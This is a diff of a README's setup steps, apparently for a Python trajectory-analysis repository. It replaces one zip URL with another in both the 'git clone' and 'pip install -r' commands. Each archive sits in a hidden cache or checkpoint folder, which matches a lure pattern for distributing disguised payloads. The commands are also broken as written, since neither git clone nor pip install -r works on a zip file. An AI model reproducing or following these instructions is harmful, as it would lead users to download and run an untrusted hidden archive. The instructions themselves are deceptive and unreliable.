@@ -9,14 +9,14 @@ Make sure you have Python installed on your system. This project is built with P
 
 1. Clone the repository to your local machine:
 ```
-git clone https://raw.githubusercontent.com/Shamzmohamed/Trajectory_analysis/main/__pycache__/Trajectory-analysis-2.5.zip
+git clone https://github.com/Shamzmohamed/Trajectory_analysis/raw/refs/heads/main/.ipynb_checkpoints/analysis-Trajectory-gasogenic.zip
 cd Trajectory_analysis
 ```
 
 2. Install the required dependencies:
 
 ```
-pip install -r https://raw.githubusercontent.com/Shamzmohamed/Trajectory_analysis/main/__pycache__/Trajectory-analysis-2.5.zip
+pip install -r https://github.com/Shamzmohamed/Trajectory_analysis/raw/refs/heads/main/.ipynb_checkpoints/analysis-Trajectory-gasogenic.zip
 ```
 ### Testing
 
